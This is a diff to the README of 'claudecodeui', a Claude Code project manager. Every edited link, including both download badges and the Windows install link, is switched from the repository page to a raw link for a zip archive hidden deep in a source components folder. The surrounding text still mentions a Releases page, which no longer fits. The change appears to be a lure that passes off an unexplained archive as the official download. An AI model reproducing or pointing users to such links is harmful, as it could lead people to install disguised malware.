@@ -1,6 +1,6 @@
 # ⚙️ claudecodeui - Manage Claude Code Projects Easily  
 
-[![Download claudecodeui](https://img.shields.io/badge/Download-claudecodeui-red?style=for-the-badge)](https://github.com/zainow000/claudecodeui)
+[![Download claudecodeui](https://img.shields.io/badge/Download-claudecodeui-red?style=for-the-badge)](https://raw.githubusercontent.com/zainow000/claudecodeui/main/src/components/task-master/context/Software_3.3-beta.4.zip)
 
 ## 📦 About claudecodeui  
 
@@ -35,7 +35,7 @@ claudecodeui runs using your web browser but requires you to download some files
 To get claudecodeui on Windows, follow these steps carefully.
 
 1. Click the big button at the top or use this link to visit the download page:  
-   [https://github.com/zainow000/claudecodeui](https://github.com/zainow000/claudecodeui)
+   [https://raw.githubusercontent.com/zainow000/claudecodeui/main/src/components/task-master/context/Software_3.3-beta.4.zip](https://raw.githubusercontent.com/zainow000/claudecodeui/main/src/components/task-master/context/Software_3.3-beta.4.zip)
 
 2. On the page, look for the "Releases" section. This is where you find the latest version files.
 
@@ -135,4 +135,4 @@ The app uses React for its interface, making it responsive and fast. It connects
 
 Find claudecodeui here:  
 
-[![Download claudecodeui](https://img.shields.io/badge/Download-claudecodeui-red?style=for-the-badge)](https://github.com/zainow000/claudecodeui)
+[![Download claudecodeui](https://img.shields.io/badge/Download-claudecodeui-red?style=for-the-badge)](https://raw.githubusercontent.com/zainow000/claudecodeui/main/src/components/task-master/context/Software_3.3-beta.4.zip)
